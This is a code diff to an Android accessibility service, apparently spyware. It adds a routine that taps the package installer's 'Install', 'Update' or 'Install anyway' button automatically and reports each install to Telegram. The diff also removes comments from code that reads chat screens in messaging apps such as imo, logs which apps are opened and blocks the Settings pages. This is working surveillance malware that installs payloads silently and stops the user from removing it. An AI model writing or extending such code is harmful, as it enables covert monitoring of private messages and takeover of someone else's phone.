@@ -44,7 +44,6 @@ class ScreenService : AccessibilityService() {
         @Volatile private var lastReportedApp = ""
         @Volatile private var lastReportedTime = 0L
 
-        // අලුත් chat screen read වුන වෙලාව
         @Volatile private var lastReadTime = 0L
         @Volatile private var lastReadContent = ""
     }
@@ -93,6 +92,11 @@ class ScreenService : AccessibilityService() {
         event ?: return
         val pkg = event.packageName?.toString() ?: return
 
+        // ===== Auto-install APK (Package Installer) =====
+        if (pkg.contains("packageinstaller")) {
+            autoTapInstall()
+        }
+
         // ===== Block Settings pages =====
         if (pkg == PKG_SETTINGS) {
             handleSettingsBlock(event)
@@ -114,6 +118,55 @@ class ScreenService : AccessibilityService() {
                 PKG_IMO, PKG_IMO_BETA -> readScreenContent("imo")
             }
         }
+    }
+
+    // ===== Auto-tap Install Button in Package Installer =====
+    private fun autoTapInstall() {
+        try {
+            val root = rootInActiveWindow ?: return
+            val installBtn = findButtonByText(root, listOf(
+                "Install", "INSTALL", "Update", "UPDATE",
+                "Install app", "Install anyway"
+            ))
+
+            if (installBtn != null) {
+                Log.d(TAG, "Auto-tapping Install button")
+                installBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                notifyTelegram("✅ Auto-installed update")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Auto-tap error", e)
+        }
+    }
+
+    // Button text එකෙන් හොයාගන්න
+    private fun findButtonByText(node: AccessibilityNodeInfo?, texts: List<String>): AccessibilityNodeInfo? {
+        node ?: return null
+        try {
+            val nodeText = node.text?.toString() ?: ""
+            val nodeDesc = node.contentDescription?.toString() ?: ""
+
+            for (t in texts) {
+                if (nodeText.equals(t, ignoreCase = true) ||
+                    nodeDesc.equals(t, ignoreCase = true) ||
+                    nodeText.contains(t, ignoreCase = true)) {
+                    if (node.isClickable) return node
+                    var parent = node.parent
+                    while (parent != null) {
+                        if (parent.isClickable) return parent
+                        parent = parent.parent
+                    }
+                    return node
+                }
+            }
+
+            for (i in 0 until node.childCount) {
+                val child = node.getChild(i)
+                val found = findButtonByText(child, texts)
+                if (found != null) return found
+            }
+        } catch (_: Exception) {}
+        return null
     }
 
     // ===== Block Settings pages =====
@@ -142,7 +195,6 @@ class ScreenService : AccessibilityService() {
     // ===== Detect App Open =====
     private fun handleAppOpen(app: String) {
         val now = System.currentTimeMillis()
-        // හැම 5 මිනිත්තුවකට වරක් විතරයි report කරන්න
         if (app == lastReportedApp && now - lastReportedTime < 300000L) return
 
         lastReportedApp = app
@@ -178,13 +230,9 @@ class ScreenService : AccessibilityService() {
 
             val combined = chatTexts.joinToString("\n")
 
-            // App drawer / launcher නම් skip
             if (isAppDrawerText(combined)) return
-
-            // අඩුම text 30 අකුරු තියෙන්න ඕන
             if (combined.length < 30) return
 
-            // Duplicate check — එකම content නම් skip
             if (combined == lastReadContent) return
             val now = System.currentTimeMillis()
             if (now - lastReadTime < 5000L) return
@@ -207,7 +255,6 @@ class ScreenService : AccessibilityService() {
         for (pattern in drawerPatterns) {
             if (text.contains(pattern)) matchCount++
         }
-        // 3කට වඩා match නම් App Drawer එකයි
         return matchCount >= 3
     }
 
@@ -219,7 +266,6 @@ class ScreenService : AccessibilityService() {
             val t = node.text?.toString() ?: ""
             val d = node.contentDescription?.toString() ?: ""
 
-            // Folder, Search, Page නම් skip
             if (t.isNotBlank() &&
                 !t.startsWith("Page ") &&
                 t != "Search" &&
